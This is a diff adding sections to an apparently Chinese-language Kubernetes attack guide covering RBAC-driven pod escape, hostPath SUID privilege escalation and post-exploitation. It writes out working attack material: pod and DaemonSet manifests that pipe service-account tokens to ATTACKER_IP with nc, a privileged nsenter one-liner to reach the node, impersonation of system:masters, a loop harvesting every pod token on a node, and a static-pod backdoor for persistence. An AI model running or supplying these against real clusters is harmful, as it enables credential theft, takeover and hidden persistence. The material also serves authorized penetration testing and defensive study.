@@ -152,3 +152,216 @@ env | sort
 # MYSQL_SERVICE_HOST=10.96.x.x
 # REDIS_SERVICE_HOST=10.96.x.x
 ```
+
+## 8. RBAC 权限驱动的 Pod 逃逸
+
+当 SA Token 拥有特定 RBAC 权限时，无需容器本身是特权模式，也可以通过创建/修改工作负载来实现逃逸。
+
+### 8.1 create pods 权限 → 创建特权 Pod 窃取 Token
+
+如果 SA 有 `create pods` 权限，可创建挂载了高权限 SA 的 Pod，窃取其 Token：
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: steal-token
+  namespace: kube-system
+spec:
+  serviceAccountName: bootstrap-signer    # 目标高权限 SA
+  automountServiceAccountToken: true
+  hostNetwork: true
+  containers:
+  - name: steal
+    image: alpine
+    command: ["/bin/sh"]
+    args: ["-c", "cat /run/secrets/kubernetes.io/serviceaccount/token | nc ATTACKER_IP 6666; sleep 99999"]
+```
+
+全特权 Pod 一键逃逸（单行命令）：
+```bash
+kubectl run r00t --restart=Never -ti --rm --image lol \
+  --overrides '{"spec":{"hostPID":true,"containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
+```
+
+### 8.2 create/patch deployments、daemonsets、statefulsets、replicasets、jobs、cronjobs
+
+这些控制器资源都可以间接创建 Pod，效果等同于 `create pods`：
+```yaml
+# 示例：通过 DaemonSet 在所有节点部署后门 Pod，窃取高权限 SA Token
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: backdoor
+  namespace: kube-system
+spec:
+  selector:
+    matchLabels:
+      name: backdoor
+  template:
+    metadata:
+      labels:
+        name: backdoor
+    spec:
+      serviceAccountName: bootstrap-signer
+      automountServiceAccountToken: true
+      hostNetwork: true
+      containers:
+      - name: backdoor
+        image: alpine
+        command: ["/bin/sh", "-c", "cat /run/secrets/kubernetes.io/serviceaccount/token | nc ATTACKER_IP 6666; sleep 99999"]
+        volumeMounts:
+        - mountPath: /host
+          name: host-root
+      volumes:
+      - name: host-root
+        hostPath:
+          path: /
+```
+
+DaemonSet 的特殊优势：会在**集群所有节点**上运行，一次操作即可窃取所有节点上运行的 SA Token。
+
+### 8.3 pods/exec 权限 → 进入现有高权限 Pod
+
+```bash
+# 列出所有 Pod 并找到 kube-system 中的高权限 Pod
+kubectl get pods --all-namespaces
+kubectl exec -it <POD_NAME> -n kube-system -- sh
+
+# 进入后窃取 SA Token
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+### 8.4 update/patch pods/ephemeralcontainers → 临时容器注入
+
+可以向已运行的 Pod 注入临时容器（ephemeral container），获得代码执行能力，甚至提权：
+```bash
+# 向目标 Pod 注入特权临时容器
+kubectl debug -it <TARGET_POD> --image=alpine --target=<CONTAINER_NAME> -- sh
+
+# 如果有 patch 权限，可以直接操作 API
+kubectl patch pod <POD_NAME> --type=strategic --subresource=ephemeralcontainers -p '{
+  "spec": {
+    "ephemeralContainers": [{
+      "name": "debugger",
+      "image": "alpine",
+      "command": ["sh"],
+      "stdin": true,
+      "tty": true,
+      "securityContext": {"privileged": true}
+    }]
+  }
+}'
+```
+
+注入到高权限 Pod 后可以窃取其 SA Token 或利用其已有的特权配置逃逸到节点。
+
+### 8.5 impersonate 权限 → 模拟高权限账户
+
+```bash
+# 模拟 system:masters 组（cluster-admin）
+kubectl get secrets --as=null --as-group=system:masters
+
+# 模拟特定 SA
+kubectl get pods --as=system:serviceaccount:kube-system:default
+
+# REST API 方式
+curl -k -H "Authorization: Bearer $SA_TOKEN" \
+  -H "Impersonate-User: null" \
+  -H "Impersonate-Group: system:masters" \
+  https://API_SERVER:6443/api/v1/namespaces/kube-system/secrets/
+```
+
+## 9. 可写 hostPath SUID 提权（容器→宿主机 root）
+
+当 Pod 挂载了可写的 hostPath 卷，且宿主机文件系统未使用 `nosuid` 选项时，可以在容器内植入 SUID 二进制文件：
+
+```bash
+# 容器内（以 root 运行）
+# MOUNT 是容器内映射到宿主机目录的挂载点路径
+MOUNT="/var/www/html/uploads"
+cp /bin/bash "$MOUNT/suidbash"
+chmod 6777 "$MOUNT/suidbash"
+
+# 宿主机上执行（需要另一个向量触发，如 SSH、其他 RCE）
+# 路径取决于 hostPath 配置
+/opt/data/uploads/suidbash -p    # -p 保留 euid 0
+```
+
+检测可写 hostPath 挂载：
+```bash
+# 容器内
+mount | column -t
+cat /proc/self/mountinfo | grep host-path
+# 测试可写性
+TEST_DIR=/var/www/html
+[ -d "$TEST_DIR" ] && [ -w "$TEST_DIR" ] && echo "writable: $TEST_DIR"
+```
+
+注意：如果宿主机挂载点有 `nosuid` 选项，SUID 位会被忽略。可通过 `cat /proc/mounts | grep <挂载点>` 检查。
+
+## 10. 节点后渗透 — 逃逸后的关键信息
+
+逃逸到节点后，以下路径包含高价值凭据：
+
+```bash
+# Kubelet 配置和凭据
+/var/lib/kubelet/kubeconfig
+/var/lib/kubelet/kubelet.conf
+/var/lib/kubelet/config.yaml
+/etc/kubernetes/kubelet.conf
+/etc/kubernetes/admin.conf    # 如存在 → cluster-admin 权限
+$HOME/.kube/config
+
+# etcd 配置（控制平面节点）
+/etc/kubernetes/manifests/etcd.yaml
+/etc/kubernetes/pki/            # K8s PKI 证书和私钥
+
+# 找到 kubelet 实际使用的 kubeconfig
+ps -ef | grep kubelet | grep kubeconfig
+
+# 窃取节点上所有 Pod 的 SA Token
+for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
+    TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
+    NS=$(cat $i)
+    echo "[$NS] $TOKEN" | head -c 80
+    echo "..."
+done
+```
+
+### 10.1 Static Pod 持久化
+
+如果已逃逸到节点，可以利用 Static Pod 在 kube-system 等命名空间中创建持久化后门：
+```bash
+# Static Pod 配置目录（默认）
+ls /etc/kubernetes/manifests/
+
+# 写入恶意 Static Pod（kubelet 自动创建并维护）
+cat > /etc/kubernetes/manifests/backdoor.yaml <<'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: backdoor
+  namespace: kube-system
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: backdoor
+    image: alpine
+    command: ["sleep", "infinity"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+EOF
+
+# 更隐蔽的方式：修改 kubelet 的 staticPodURL 从远程拉取
+# 修改 /var/lib/kubelet/config.yaml 中的 staticPodURL 字段
+```
+
+Static Pod 由 kubelet 直接管理，API Server 只能看到镜像 Pod（mirror pod），无法从 API 层面删除。
